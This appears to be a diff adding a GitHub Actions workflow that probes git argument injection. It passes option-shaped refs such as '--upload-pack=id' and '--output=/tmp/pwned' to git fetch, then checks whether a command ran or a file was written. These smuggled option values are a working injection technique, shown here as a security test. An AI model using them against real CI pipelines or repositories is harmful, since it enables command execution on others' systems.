@@ -1,0 +1,22 @@
+name: dashref-checkout
+on: workflow_dispatch
+permissions:
+  contents: read
+jobs:
+  checkout-dash:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Show what checkout does with option-shaped ref
+        run: |
+          set -x
+          git init
+          git remote add origin "https://github.com/${{ github.repository }}.git"
+          # Mimic vulnerable pattern: pass ref as bare argv to git
+          REF='--output=/tmp/pwned'
+          echo "Attempting git fetch origin $REF"
+          git fetch origin "$REF" 2>&1 | tee /tmp/fetch-out.txt || true
+          ls -la /tmp/pwned 2>/dev/null && echo "FILE_WRITE_VIA_REF=YES" || echo "FILE_WRITE_VIA_REF=no"
+          # Also try actions/checkout style
+          REF2='--upload-pack=id'
+          git fetch origin "$REF2" 2>&1 | tee -a /tmp/fetch-out.txt || true
+          cat /tmp/fetch-out.txt
